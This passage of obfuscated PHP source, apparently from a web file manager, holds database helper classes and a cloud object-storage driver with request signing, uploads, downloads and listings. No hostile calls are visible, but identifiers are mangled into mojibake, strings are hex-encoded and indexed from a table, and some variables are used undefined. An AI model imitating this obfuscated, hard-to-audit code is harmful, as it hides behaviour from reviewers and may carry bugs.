$™İÒŞŸé .= $ö†—„œœ[51] . $İ“åÔ£ö . $ö†—„œœ[53]; } } return $™İÒŞŸé; } public function parseKey(&$Ìš“»Î†, $½âÊú»Ô = true) { $ Â«£óÛ =& $_SERVER[èùÙ¹Ïö]; if ($½âÊú»Ô) { $Ìš“»Î† = $this->parseKeyCheck($Ìš“»Î†); } if ($this->dbType == $ Â«£óÛ[993]) { if ($Ìš“»Î† != $ Â«£óÛ[205] && !preg_match($ Â«£óÛ[957], $Ìš“»Î†)) { $Ìš“»Î† = $ Â«£óÛ[431] . trim($Ìš“»Î†, $ Â«£óÛ[431]) . $ Â«£óÛ[431]; } return $Ìš“»Î†; } else { return parent::parseKey($Ìš“»Î†, $½âÊú»Ô); } } public function close() { $this->_linkID = null; } public function error() { $÷ú½ÜŠ =& $_SERVER[èùÙ¹Ïö]; if ($this->PDOStatement) { $ûÅº¢  = $this->PDOStatement->errorInfo(); $this->error = $ûÅº¢ [1] . $÷ú½ÜŠ[4] . $ûÅº¢ [2]; } else { $this->error = $÷ú½ÜŠ[12]; } if ($÷ú½ÜŠ[12] != $this->queryStr) { $this->error .= LNG($÷ú½ÜŠ[48]) . $this->queryStr; } think_trace($this->error, $÷ú½ÜŠ[12], $÷ú½ÜŠ[49]); return $this->error; } public function escapeString($ÔÇŠœğş) { $»ßôö˜Ú =& $_SERVER[èùÙ¹Ïö]; switch ($this->dbType) { case $»ßôö˜Ú[990]: case $»ßôö˜Ú[963]: case $»ßôö˜Ú[981]: case $»ßôö˜Ú[993]: return addslashes($ÔÇŠœğş); case $»ßôö˜Ú[965]: case $»ßôö˜Ú[982]: case $»ßôö˜Ú[964]: case $»ßôö˜Ú[966]: return str_ireplace($»ßôö˜Ú[58], $»ßôö˜Ú[59], $ÔÇŠœğş); } } protected function parseValue($ÈôÊôíÆ) { $à¸é²åÊ =& $_SERVER[èùÙ¹Ïö]; if (is_string($ÈôÊôíÆ)) { $èË°Æä§ = strpos($ÈôÊôíÆ, $à¸é²åÊ[4]) === 0 && in_array($ÈôÊôíÆ, array_keys($this->bind)); $ÈôÊôíÆ = $èË°Æä§ ? $this->escapeString($ÈôÊôíÆ) : $à¸é²åÊ[1003] . $this->escapeString($ÈôÊôíÆ) . $à¸é²åÊ[1003]; } elseif (isset($ÈôÊôíÆ[0]) && is_string($ÈôÊôíÆ[0]) && strtolower($ÈôÊôíÆ[0]) == $à¸é²åÊ[343]) { $ÈôÊôíÆ = $this->escapeString($ÈôÊôíÆ[1]); } elseif (is_array($ÈôÊôíÆ)) { $ÈôÊôíÆ = array_map(array($this, $à¸é²åÊ[1004]), $ÈôÊôíÆ); } elseif (is_bool($ÈôÊôíÆ)) { $ÈôÊôíÆ = $ÈôÊôíÆ ? $à¸é²åÊ[90] : $à¸é²åÊ[214]; } elseif (is_null($ÈôÊôíÆ)) { $ÈôÊôíÆ = $à¸é²åÊ[105]; } return $ÈôÊôíÆ; } public function getLastInsertId() { $¤úöŞü =& $_SERVER[èùÙ¹Ïö]; switch ($this->dbType) { case $¤úöŞü[990]: case $¤úöŞü[982]: case $¤úöŞü[963]: case $¤úöŞü[981]: case $¤úöŞü[965]: case $¤úöŞü[993]: return $this->_linkID->lastInsertId(); case $¤úöŞü[964]: case $¤úöŞü[966]: $Ç±‰ïº° = $this->table; $şî”Œé = $this->query("\x53\x45\x4c\x45\x43\x54\x20{$Ç±‰ïº°}\56\143\165\162\162\166\x61\154\x20\x63\x75\x72\x72\166\141\154\x20\106\122\x4f\x4d\40\144\x75\x61\154"); return $şî”Œé ? $şî”Œé[0][$¤úöŞü[1005]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ã›üÆğ·) { $í‡öâ =& $_SERVER[èùÙ¹Ïö]; if (!CacheLock::fileLock($í‡öâ[13])) { return !1; } $­•Ï²ÇÂ = parent::query($ã›üÆğ·); CacheLock::fileUnLock($í‡öâ[13]); return $­•Ï²ÇÂ; } public function execute($ïÃ¤Ê²ê) { $‡•Ûïœ¬ =& $_SERVER[èùÙ¹Ïö]; if (!CacheLock::fileLock($‡•Ûïœ¬[13])) { return !1; } $¦¾Ô³ìÄ = parent::execute($ïÃ¤Ê²ê); CacheLock::fileUnLock($‡•Ûïœ¬[13]); return $¦¾Ô³ìÄ; } } class DbSqlite3 extends DbSqlite3Base { public function query($‰¿ä—½Ç) { $÷–§¼¨» =& $_SERVER[èùÙ¹Ïö]; if (!CacheLock::fileLock($÷–§¼¨»[13])) { return !1; } $©éÁº = parent::query($‰¿ä—½Ç); CacheLock::fileUnLock($÷–§¼¨»[13]); return $©éÁº; } public function execute($‘Ÿ¬ï¹î) { $õàôã—• =& $_SERVER[èùÙ¹Ïö]; if (!CacheLock::fileLock($õàôã—•[13])) { return !1; } $‰ß„Ë… = parent::execute($‘Ÿ¬ï¹î); CacheLock::fileUnLock($õàôã—•[13]); return $‰ß„Ë…; } } goto dÔ‹ãŸÎÕ; dµ“à³¿İ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\x3a\x2f\57\166\60\56\x61\x70\x69\x2e\165\160\171\165\156\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¤Ô‡ÜÑ©) { parent::__construct(); $this->_init($¤Ô‡ÜÑ©); } public function _init($‹¤é¨“°) { $¦£ºÒª‘ =& $_SERVER[èùÙ¹Ïö]; foreach ($‹¤é¨“° as $ŞÃÈéÒØ => $²”©îË) { if (isset($this->{$ŞÃÈéÒØ})) { $this->{$ŞÃÈéÒØ} = $²”©îË; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¦£ºÒª‘[1489] . LNG($¦£ºÒª‘[1421])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($çòŸğÎè, $£š¢¼ß° = "\x47\105\x54") { $©ÔÍ¹€ =& $_SERVER[èùÙ¹Ïö]; $†ü¸˜¼À = gmdate($©ÔÍ¹€[1454]); $ŠŒƒà = base64_encode(hash_hmac($©ÔÍ¹€[1490], "{$£š¢¼ß°}\x26{$çòŸğÎè}\x26{$†ü¸˜¼À}", md5("{$this->userpass}"), !0)); $õ×ÛĞı‰ = array("\x41\165\164\x68\x6f\162\x69\172\x61\164\151\157\156\72\x55\120\x59\125\x4e\40{$this->username}\72{$ŠŒƒà}", "\x44\141\164\145\72{$†ü¸˜¼À}"); return $õ×ÛĞı‰; } public function ussRequest($ış˜Ÿ‘î, $ÆËç¦Ê = "\x47\105\124", $õ ÖÆŒÙ = false, $¶‘àŒÀ× = false, $öÁöÂîõ = false) { $±¸Ÿâ¸ò =& $_SERVER[èùÙ¹Ïö]; $ış˜Ÿ‘î = trim($ış˜Ÿ‘î, $±¸Ÿâ¸ò[8]); $øŠêŸ› = "\57{$this->bucket}\x2f{$ış˜Ÿ‘î}"; $‘£ÒÏÏù = $this->ussHeaders($øŠêŸ›, $ÆËç¦Ê); if ($¶‘àŒÀ×) { $‘£ÒÏÏù = array_merge($‘£ÒÏÏù, $¶‘àŒÀ×); } $¼İí÷òä = url_request($this->endpoint . $øŠêŸ›, $ÆËç¦Ê, $õ ÖÆŒÙ, $‘£ÒÏÏù, $öÁöÂîõ); if (!$¼İí÷òä) { return array($±¸Ÿâ¸ò[1260] => !1, $±¸Ÿâ¸ò[1250] => $±¸Ÿâ¸ò[1491]); } if (strtolower($ÆËç¦Ê) == $±¸Ÿâ¸ò[213] || in_array($¼İí÷òä[$±¸Ÿâ¸ò[1260]], array($±¸Ÿâ¸ò[259], $±¸Ÿâ¸ò[1492]))) { $õ ÖÆŒÙ = $¼İí÷òä[$±¸Ÿâ¸ò[1493]]; } else { $õ ÖÆŒÙ = json_decode($¼İí÷òä[$±¸Ÿâ¸ò[1250]], !0); if (!$õ ÖÆŒÙ) { $õ ÖÆŒÙ = $¼İí÷òä[$±¸Ÿâ¸ò[1250]]; } else { if (!$¼İí÷òä[$±¸Ÿâ¸ò[790]] && isset($õ ÖÆŒÙ[$±¸Ÿâ¸ò[1494]])) { $õ ÖÆŒÙ = $õ ÖÆŒÙ[$±¸Ÿâ¸ò[1494]]; } } } return array($±¸Ÿâ¸ò[1260] => $¼İí÷òä[$±¸Ÿâ¸ò[790]], $±¸Ÿâ¸ò[1250] => $õ ÖÆŒÙ); } public function mkfile($­šå°Çè, $È†ÒúÔ = '', $¬ë§ÌÒ½ = REPEAT_RENAME) { if ($this->setContent($­šå°Çè, $È†ÒúÔ)) { return $this->getPathOuter($­šå°Çè); } return !1; } public function mkdir($¬ıÚ˜¼—, $ø´§ü²Ç = REPEAT_SKIP) { $ç”™¯ÁÀ =& $_SERVER[èùÙ¹Ïö]; $ß–Üıä’ = trim($¬ıÚ˜¼—, $ç”™¯ÁÀ[8]); if ($this->_isFolder($ß–Üıä’)) { return $this->getPathOuter($ß–Üıä’); } $·Ô·«Â¼ = array($ç”™¯ÁÀ[1495]); $…ìˆ‘Ûú = $this->ussRequest($ß–Üıä’, $ç”™¯ÁÀ[243], !1, $·Ô·«Â¼); return $…ìˆ‘Ûú[$ç”™¯ÁÀ[1260]] ? $this->getPathOuter($ß–Üıä’) : !1; } public function copyFile($´¢Ë¶‹, $Ø€Äğçâ) { $ïÃªĞ£Š =& $_SERVER[èùÙ¹Ïö]; $ñı¹à¸ß = array($ïÃªĞ£Š[1496] . "\57{$this->bucket}\x2f{$´¢Ë¶‹}", $ïÃªĞ£Š[1497]); $ü˜ÅŠêµ = $this->ussRequest($Ø€Äğçâ, $ïÃªĞ£Š[245], !1, $ñı¹à¸ß); return $ü˜ÅŠêµ[$ïÃªĞ£Š[1260]] ? !0 : $this->getPathOuter($Ø€Äğçâ); } public function moveFile($ˆ‘éÖ½˜, $ş„ØÃ) { $óÁÉôû€ =& $_SERVER[èùÙ¹Ïö]; $ Èˆê§ = array($óÁÉôû€[1498] . "\x2f{$this->bucket}\57{$ˆ‘éÖ½˜}", $óÁÉôû€[1497]); $©ş›ƒ–Ø = $this->ussRequest($ş„ØÃ, $óÁÉôû€[245], !1, $ Èˆê§); return $©ş›ƒ–Ø[$óÁÉôû€[1260]] ? !0 : $this->getPathOuter($ş„ØÃ); } public function delFile($„ëê’•ò) { $áãÆ¦§ =& $_SERVER[èùÙ¹Ïö]; $ûÑùòœ† = $this->ussRequest($„ëê’•ò, $áãÆ¦§[1499]); return $ûÑùòœ†[$áãÆ¦§[1260]] ? !0 : !1; } public function delFolder($À‰ÛŸ¼Î) { $ëøÂà † =& $_SERVER[èùÙ¹Ïö]; if (!$this->exist($À‰ÛŸ¼Î)) { return !0; } $this->listItemCache = !1; $¦¡ßø¿Ó = $ÑêÆÚñ = array(); $this->fileList($À‰ÛŸ¼Î, $¦¡ßø¿Ó, $ÑêÆÚñ, !0); $this->listItemCache = !0; foreach ($ÑêÆÚñ as $éÔûŠ·°) { $Åü€ñ = $this->ussRequest($éÔûŠ·°[$ëøÂà †[32]], $ëøÂà †[1499]); if (!$Åü€ñ[$ëøÂà †[1260]]) { return !1; } } foreach ($¦¡ßø¿Ó as $ïß¦Šæ) { $Åü€ñ = $this->ussRequest($ïß¦Šæ, $ëøÂà †[1499]); if (!$Åü€ñ[$ëøÂà †[1260]]) { return !1; } } $Åü€ñ = $this->ussRequest($À‰ÛŸ¼Î, $ëøÂà †[1499]); return $Åü€ñ[$ëøÂà †[1260]]; } public function rename($„åıøÍµ, $¢è‰Ï€Ì) { if ($this->isFile($„åıøÍµ)) { $¢è‰Ï€Ì = get_path_father($„åıøÍµ) . $¢è‰Ï€Ì; return $this->moveFile($„åıøÍµ, $¢è‰Ï€Ì); } return $this->renameObject($„åıøÍµ, $¢è‰Ï€Ì); } public function fileInfo($â¨œÉÁù, $ûüîö–ğ = false, $ëƒ¦à›Ò = array()) { $è“³™ï =& $_SERVER[èùÙ¹Ïö]; $Û¢€ûİ = array($è“³™ï[32] => $this->pathThis($â¨œÉÁù), $è“³™ï[86] => $this->getPathOuter($è“³™ï[8] . $â¨œÉÁù), $è“³™ï[33] => $è“³™ï[216], $è“³™ï[78] => isset($ëƒ¦à›Ò[$è“³™ï[78]]) ? $ëƒ¦à›Ò[$è“³™ï[78]] : 0, $è“³™ï[177] => $this->ext($â¨œÉÁù)); if ($ûüîö–ğ) { return $Û¢€ûİ; } $Û¢€ûİ[$è“³™ï[217]] = $Û¢€ûİ[$è“³™ï[87]] = 0; $Û¢€ûİ[$è“³™ï[218]] = $Û¢€ûİ[$è“³™ï[219]] = !0; if (empty($ëƒ¦à›Ò)) { $ëƒ¦à›Ò = $this->objectMeta($â¨œÉÁù); if (!$ëƒ¦à›Ò) { return $Û¢€ûİ; } } $Û¢€ûİ[$è“³™ï[217]] = intval($ëƒ¦à›Ò[$è“³™ï[1500]]); $Û¢€ûİ[$è“³™ï[87]] = intval($ëƒ¦à›Ò[$è“³™ï[1501]]); $Û¢€ûİ[$è“³™ï[78]] = $ëƒ¦à›Ò[$è“³™ï[78]]; return $Û¢€ûİ; } public function folderInfo($½‹«˜¶¦, $¸ÃÑ·ŞĞ = false) { $‘ÅÜäõí =& $_SERVER[èùÙ¹Ïö]; $Öß·ß¯Û = array($‘ÅÜäõí[32] => $this->pathThis($½‹«˜¶¦), $‘ÅÜäõí[86] => $this->getPathOuter($‘ÅÜäõí[8] . $½‹«˜¶¦), $‘ÅÜäõí[33] => $‘ÅÜäõí[77]); if ($¸ÃÑ·ŞĞ) { return $Öß·ß¯Û; } $Öß·ß¯Û[$‘ÅÜäõí[217]] = $Öß·ß¯Û[$‘ÅÜäõí[87]] = 0; $Öß·ß¯Û[$‘ÅÜäõí[218]] = $Öß·ß¯Û[$‘ÅÜäõí[219]] = !0; if (empty($¯¯¬£¨²)) { $¯¯¬£¨² = $this->objectMeta($½‹«˜¶¦); if (!$¯¯¬£¨²) { return $Öß·ß¯Û; } } $Öß·ß¯Û[$‘ÅÜäõí[217]] = intval($¯¯¬£¨²[$‘ÅÜäõí[1500]]); $Öß·ß¯Û[$‘ÅÜäõí[87]] = intval($¯¯¬£¨²[$‘ÅÜäõí[1501]]); return $Öß·ß¯Û; } private function listObjs($àÆ üƒƒ, $ÕŠÙÓ–ğ = 0, $ÒæÙİ¢Ò = 1000) { $²èŠáÑ =& $_SERVER[èùÙ¹Ïö]; $îÂÄç»Ñ = array($²èŠáÑ[1502], $²èŠáÑ[1503] . $ÒæÙİ¢Ò); if ($ÕŠÙÓ–ğ) { $îÂÄç»Ñ[] = $²èŠáÑ[1504] . $ÕŠÙÓ–ğ; } $â£Ÿî” = $this->ussRequest($àÆ üƒƒ, $²èŠáÑ[247], !1, $îÂÄç»Ñ); return !$â£Ÿî”[$²èŠáÑ[1260]] ? !1 : $â£Ÿî”[$²èŠáÑ[1250]]; } private function fileList($‰‘¥Öõ’, &$ÈòØÜÑœ, &$¸Æ‰¡ı, $™áİµÛ– = false) { $âŞ¡´¸¡ =& $_SERVER[èùÙ¹Ïö]; $¦€†­ = $âŞ¡´¸¡[12]; $Â°ñ¬Æ = 1000; $üõØ“¨ö = rtrim($‰‘¥Öõ’, $âŞ¡´¸¡[8]) . $âŞ¡´¸¡[8]; while (!0) { check_abort(); $ëßñı¥Ş = $this->listObjs($‰‘¥Öõ’, $¦€†­, $Â°ñ¬Æ); if (!$ëßñı¥Ş) { return !1; } $¦€†­ = isset($ëßñı¥Ş[$âŞ¡´¸¡[1505]]) ? $ëßñı¥Ş[$âŞ¡´¸¡[1505]] : $âŞ¡´¸¡[12]; $÷°ƒ¤¼ê = isset($ëßñı¥Ş[$âŞ¡´¸¡[1506]]) ? $ëßñı¥Ş[$âŞ¡´¸¡[1506]] : array(); foreach ($÷°ƒ¤¼ê as $“¯êË‡) { $‰äÄø†± = $“¯êË‡[$âŞ¡´¸¡[33]] == $âŞ¡´¸¡[77] ? !0 : !1; $íóÛ¨®æ = ltrim($üõØ“¨ö . $“¯êË‡[$âŞ¡´¸¡[32]], $âŞ¡´¸¡[8]) . ($‰äÄø†± ? $âŞ¡´¸¡[8] : $âŞ¡´¸¡[12]); $¯¥õ“Şœ = array($âŞ¡´¸¡[32] => $íóÛ¨®æ, $âŞ¡´¸¡[33] => $‰äÄø†± ? $âŞ¡´¸¡[77] : $âŞ¡´¸¡[216], $âŞ¡´¸¡[78] => $“¯êË‡[$âŞ¡´¸¡[383]], $âŞ¡´¸¡[1501] => $“¯êË‡[$âŞ¡´¸¡[1507]]); $this->cacheMethodInfoSet($íóÛ¨®æ, $‰äÄø†±, $¯¥õ“Şœ); if ($‰äÄø†±) { $ÈòØÜÑœ[] = $íóÛ¨®æ; if ($™áİµÛ–) { $this->fileList($íóÛ¨®æ, $ÈòØÜÑœ, $¸Æ‰¡ı, $™áİµÛ–); } continue; } $¸Æ‰¡ı[] = $¯¥õ“Şœ; } if (count($÷°ƒ¤¼ê) < $Â°ñ¬Æ) { break; } } $this->cacheMethodInfoSet($‰‘¥Öõ’, !0); } public function listPath($ÛĞø°¿², $àÇè‰ÕÉ = false) { $Š‡¯»ó =& $_SERVER[èùÙ¹Ïö]; $±ó’²ø  = $‹–ƒ¿² = array(); $this->fileList($ÛĞø°¿², $±ó’²ø , $‹–ƒ¿²); foreach ($±ó’²ø  as $ñïğªâÕ => $ö½Š€È) { $±ó’²ø [$ñïğªâÕ] = $this->folderInfo($ö½Š€È, $àÇè‰ÕÉ); } foreach ($‹–ƒ¿² as $ñïğªâÕ => $ö½Š€È) { $‹–ƒ¿²[$ñïğªâÕ] = $this->fileInfo($ö½Š€È[$Š‡¯»ó[32]], $àÇè‰ÕÉ, $ö½Š€È); } return array($Š‡¯»ó[84] => $±ó’²ø , $Š‡¯»ó[85] => $‹–ƒ¿²); } public function has($‹Óî˜ûë, $¡Ú¤Ë‰á = false, $±ÑâÀºÉ = true) { $¤£øŸ•ó =& $_SERVER[èùÙ¹Ïö]; $µÈ ÂÌ = $¤£øŸ•ó[12]; $±ˆí Ë´ = 500; $Îòø™üå = 0; $©ñ²Û„ = 0; $İáÎä¼ = rtrim($‹Óî˜ûë, $¤£øŸ•ó[8]) . $¤£øŸ•ó[8]; while (!0) { check_abort(); $îŞËàü  = $this->listObjs($‹Óî˜ûë, $µÈ ÂÌ, $±ˆí Ë´); if (!$îŞËàü ) { return !1; } $µÈ ÂÌ = isset($îŞËàü [$¤£øŸ•ó[1505]]) ? $îŞËàü [$¤£øŸ•ó[1505]] : $¤£øŸ•ó[12]; $ñã‚ê‡è = isset($îŞËàü [$¤£øŸ•ó[1506]]) ? $îŞËàü [$¤£øŸ•ó[1506]] : array(); if (empty($ñã‚ê‡è)) { break; } $óù©‹ŒÔ = array_filter($ñã‚ê‡è, function ($»¿â¾ş) { $«è”ğñÇ =& $_SERVER[èùÙ¹Ïö]; return $»¿â¾ş[$«è”ğñÇ[33]] == $«è”ğñÇ[77]; }); $¾Îë¯úå = count($ñã‚ê‡è); $óù©‹ŒÔ = count($óù©‹ŒÔ); $€Äà¢ = $¾Îë¯úå - $óù©‹ŒÔ; if ($¡Ú¤Ë‰á) { $©ñ²Û„ += $óù©‹ŒÔ; $Îòø™üå += $€Äà¢; if ($¾Îë¯úå < $±ˆí Ë´) { break; } continue; } if ($±ÑâÀºÉ) { if ($€Äà¢) { return !0; } } else { if ($óù©‹ŒÔ) { return !0; } } if ($¾Îë¯úå < $±ˆí Ë´) { break; } } if ($¡Ú¤Ë‰á) { return array($¤£øŸ•ó[225] => $Îòø™üå, $¤£øŸ•ó[226] => $©ñ²Û„); } return !1; } public function listAll($ÚÙøŒá•) { $æĞ“ä£Î =& $_SERVER[èùÙ¹Ïö]; $Š“şİŸ’ = $‚‹Ñ·æ» = array(); $this->fileList($ÚÙøŒá•, $Š“şİŸ’, $‚‹Ñ·æ», !0); $…í»„† = array_to_keyvalue($‚‹Ñ·æ», $æĞ“ä£Î[32]); foreach ($Š“şİŸ’ as $ÛŒ™ˆ¼) { if (is_string($ÛŒ™ˆ¼)) { $…í»„†[$ÛŒ™ˆ¼] = array($æĞ“ä£Î[78] => 0); } } return $this->listAllFiles($ÚÙøŒá•, $…í»„†); } public function canRead($Ô¡¼¶€) { return $this->exist($Ô¡¼¶€) ? !0 : !1; } public function canWrite($Éœçé„) { return $this->exist($Éœçé„) ? !0 : !1; } public function getContent($³ñèÏ‰) { return $this->fileSubstr($³ñèÏ‰, 0, -1); } public function setContent($×şËò†Ê, $ã›¸ò§¶ = '') { $õ—›Šô• =& $_SERVER[èùÙ¹Ïö]; if (!$ã›¸ò§¶) { $¼‰æ’Şñ = $this->ussRequest($×şËò†Ê, $õ—›Šô•[243]); return $¼‰æ’Şñ[$õ—›Šô•[1260]]; } $²ÓÄêô… = $this->tempFile($this->pathThis($×şËò†Ê)); file_put_contents($²ÓÄêô…, $ã›¸ò§¶); if ($this->upload($×şËò†Ê, $²ÓÄêô…)) { $this->tempFileRemve($²ÓÄêô…); return !0; } return !1; } public function fileSubstr($®Ë«€‚®, $ØÙ¨·Üé, $î¶í§º) { $£é¡áíÁ =& $_SERVER[èùÙ¹Ïö]; if (!($íïûŠãÎ = $this->link($®Ë«€‚®))) { return !1; } $©Œß¯ß  = !1; if ($î¶í§º > 0) { $ıç–‹² = $ØÙ¨·Üé + $î¶í§º - 1; $©Œß¯ß  = array($£é¡áíÁ[1468] . $ØÙ¨·Üé . $£é¡áíÁ[432] . $ıç–‹²); } $ÅøÜÇ‹ = url_request($íïûŠãÎ, $£é¡áíÁ[247], !1, $©Œß¯ß ); return $ÅøÜÇ‹[$£é¡áíÁ[790]] ? $ÅøÜÇ‹[$£é¡áíÁ[1250]] : !1; } public function upload($ ŸŠÛß•, $Œ–ãüç÷, $ “¶‘æ = false, $íµÄ¸²ë = REPEAT_REPLACE) { $Óîùôíë =& $_SERVER[èùÙ¹Ïö]; $ÕÚ£¦äÛ = IO::size($Œ–ãüç÷); if ($ÕÚ£¦äÛ <= 1024 * 1024 * 200) { $âÁËğıÁ = array($Óîùôíë[1508] . $Œ–ãüç÷); $ùÏ”›ßù = $this->ussRequest($ ŸŠÛß•, $Óîùôíë[245], $âÁËğıÁ); return $ùÏ”›ßù[$Óîùôíë[1260]] ? $this->getPathOuter($ ŸŠÛß•) : !1; } $ó˜µà£û = 1024 * 1024 * 10; $ìıÓÂãÊ = array($Óîùôíë[1509], $Óîùôíë[1510] . $ÕÚ£¦äÛ, $Óîùôíë[1511], $Óîùôíë[1512] . $ó˜µà£û); $ùÏ”›ßù = $this->ussRequest($ ŸŠÛß•, $Óîùôíë[245], !1, $ìıÓÂãÊ); if (!$ùÏ”›ßù[$Óîùôíë[1260]]) { return !1; } $ì†¶û­Ø = $ùÏ”›ßù[$Óîùôíë[1250]]; $ÜÍØ«û¶ = 0; $ø¹àŠÁ = $ì†¶û­Ø[$Óîùôíë[1513]]; $ø¾×úé€ = fopen($Œ–ãüç÷, $Óîùôíë[1415]); if (!$ø¾×úé€) { return !1; } do { $èâ®á§¶ = $ì†¶û­Ø[$Óîùôíë[1514]]; fseek_64($ø¾×úé€, $ÜÍØ«û¶); $Õ„¥Û¿ = fread($ø¾×úé€, $èâ®á§¶); $×ÁŒŒ­² = 0; do { $×ÁŒŒ­²++; $ì†¶û­Ø = $this->uploadPart($ ŸŠÛß•, $ì†¶û­Ø, $Õ„¥Û¿); } while (!$ì†¶û­Ø && $×ÁŒŒ­² < 3); if (!$ì†¶û­Ø) { return !1; } $ø¹àŠÁ = $ì†¶û­Ø[$Óîùôíë[1513]]; $ÜÍØ«û¶ += $èâ®á§¶; } while ($ø¹àŠÁ != -1); fclose($ø¾×úé€); $ìıÓÂãÊ = array($Óîùôíë[1515], $Óîùôíë[1516] . $ì†¶û­Ø[$Óîùôíë[1517]], $Óîùôíë[1511]); $ùÏ”›ßù = $this->ussRequest($ ŸŠÛß•, $Óîùôíë[245], !1, $ìıÓÂãÊ); return $ùÏ”›ßù[$Óîùôíë[1260]] ? $this->getPathOuter($ùìÜığº) : !1; } private function uploadPart($í¾¬­äİ, $ã§ĞñŸÂ, &$¨©º«ç) { $Ëõé¦Ğú =& $_SERVER[èùÙ¹Ïö]; $şÙüñ·Æ = array($Ëõé¦Ğú[1518], $Ëõé¦Ğú[1516] . $ã§ĞñŸÂ[$Ëõé¦Ğú[1517]], $Ëõé¦Ğú[1519] . $ã§ĞñŸÂ[$Ëõé¦Ğú[1513]], $Ëõé¦Ğú[145] . $ã§ĞñŸÂ[$Ëõé¦Ğú[1514]]); $ÛÀíÊ¶ = $this->ussRequest($í¾¬­äİ, $Ëõé¦Ğú[245], $¨©º«ç, $şÙüñ·Æ); return !$ÛÀíÊ¶[$Ëõé¦Ğú[1260]] ? $ÛÀíÊ¶[$Ëõé¦Ğú[1260]] : $ÛÀíÊ¶[$Ëõé¦Ğú[1250]]; } public function uploadFormData($˜Œİşä, $Ú¢¾ÇÏ = 3600) { return $this->uploadPolicy($˜Œİşä, $Ú¢¾ÇÏ); } public function multiUploadFormData($£…»ëé“, $·†²ö²ˆ = 3600) { $úÍ²ä‡ =& $_SERVER[èùÙ¹Ïö]; $±Ïß÷ãş = (int) $GLOBALS[$úÍ²ä‡[7]][$úÍ²ä‡[78]]; return $this->uploadPolicy($£…»ëé“, $·†²ö²ˆ, $±Ïß÷ãş); } private function uploadPolicy($Ë›¬ÁŒ, $©œó¶Î = 3600, $ÊÍ‰Ì¼İ = 0) { $ñ¿ØÌó =& $_SERVER[èùÙ¹Ïö]; $éö¤°ˆÓ = $ñ¿ØÌó[8] . $this->bucket; $ã¿øèÛÒ = gmdate($ñ¿ØÌó[1454]); $Œ¥’Úäë = array($ñ¿ØÌó[1520] => $this->bucket, $ñ¿ØÌó[1521] => $Ë›¬ÁŒ, $ñ¿ØÌó[1522] => time() + $©œó¶Î, $ñ¿ØÌó[1523] => $ã¿øèÛÒ); if ($ÊÍ‰Ì¼İ) { $Œ¥’Úäë[$ñ¿ØÌó[1435]] = $ÊÍ‰Ì¼İ; } $’Ÿ×Äâ = base64_encode(json_encode($Œ¥’Úäë)); $—ö¥¤ = base64_encode(hash_hmac($ñ¿ØÌó[1490], "\x50\x4f\123\124\x26{$éö¤°ˆÓ}\46{$ã¿øèÛÒ}\x26{$’Ÿ×Äâ}", md5("{$this->userpass}"), !0)); $ã§êñ ¡ = array($ñ¿ØÌó[278] => $’Ÿ×Äâ, $ñ¿ØÌó[1524] => "\x55\120\x59\125\116\x20{$this->username}\72{$—ö¥¤}", $ñ¿ØÌó[198] => $this->endpoint . $éö¤°ˆÓ); return $ã§êñ ¡; } public function download($±“¨Éí, $ÒÊ…ø‡Ã) { $¬æí­š£ = IO::getPathInner(IO::mkfile($ÒÊ…ø‡Ã)); if (!($ßûü«¨  = $this->link($±“¨Éí))) { return !1; } $Âî€…÷Û = 0; $ˆŠÇ˜Ó = 1024 * 200; $•ö¥³ğë = fopen($¬æí­š£, $_SERVER[èùÙ¹Ïö][1474]); while (!0) { $éæŸŠ¨ = $this->fileSubstr($±“¨Éí, $Âî€…÷Û, $ˆŠÇ˜Ó); if ($éæŸŠ¨ === !1) { return !1; } fwrite($•ö¥³ğë, $éæŸŠ¨); $Âî€…÷Û += $ˆŠÇ˜Ó; if (strlen($éæŸŠ¨) < $ˆŠÇ˜Ó) { break; } } fclose($•ö¥³ğë); return $ÒÊ…ø‡Ã; } public function link($Ã£¸äô, $âÇš±€œ = array()) { $˜—Ï†Œ° =& $_SERVER[èùÙ¹Ïö]; $Ã£¸äô = trim($Ã£¸äô, $˜—Ï†Œ°[8]); if (!empty($this->token)) { $İêâã§ã = strtotime(date($˜—Ï†Œ°[1525])); $”È°ÜªÚ = substr(md5($this->token . $˜—Ï†Œ°[330] . $İêâã§ã . $˜—Ï†Œ°[1526] . $Ã£¸äô), 12, 8) . $İêâã§ã; $âÇš±€œ[] = $˜—Ï†Œ°[1527] . $”È°ÜªÚ; } $—°üª¢ = !empty($âÇš±€œ) ? $˜—Ï†Œ°[75] . implode($˜—Ï†Œ°[330], $âÇš±€œ) : $˜—Ï†Œ°[12]; return $this->getHost() . $˜—Ï†Œ°[8] . $Ã£¸äô . $—°üª¢; } public function fileOut($ëªœ™ê, $í‹¯êäá = false, $ÈÄå¬…¡ = false, $­ç“ŠÓ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ëªœ™ê, $í‹¯êäá, $ÈÄå¬…¡, $­ç“ŠÓ); } if (!$ÈÄå¬…¡) { $ÈÄå¬…¡ = $this->pathThis($ëªœ™ê); } $ì©®¡Âö = $í‹¯êäá ? array($_SERVER[èùÙ¹Ïö][1528] . rawurlencode($ÈÄå¬…¡)) : array(); $èå‹÷ô’ = $this->link($ëªœ™ê, $ì©®¡Âö); $this->fileOutLink($èå‹÷ô’); } public function fileOutServer($ñ²£‰½, $ì¾„Šöè = false, $£ä½Ø¸ = false, $ø–êìä = '') { parent::fileOut($ñ²£‰½, $ì¾„Šöè, $£ä½Ø¸, $ø–êìä); } public function fileOutImage($·¢áÌ¥, $â®ÑÓ–· = 250) { $ïÎåâ° = $this->link($·¢áÌ¥ . $_SERVER[èùÙ¹Ïö][1529] . $â®ÑÓ–·); $this->fileOutLink($ïÎåâ°); } public function fileOutImageServer($áòõºÈñ, $ø¾Ôî‹­ = 250) { parent::fileOutImage($áòõºÈñ, $ø¾Ôî‹­); } public function hashMd5($ìù«²Ş) { $ƒ’şàĞ½ =& $_SERVER[èùÙ¹Ïö]; $„èÖ—‹ƒ = $this->_objectMeta($ìù«²Ş); return isset($„èÖ—‹ƒ[$ƒ’şàĞ½[230]]) ? $„èÖ—‹ƒ[$ƒ’şàĞ½[230]] : !1; } public function size($É†Ë¯¨ô) { $íıà…†ü = 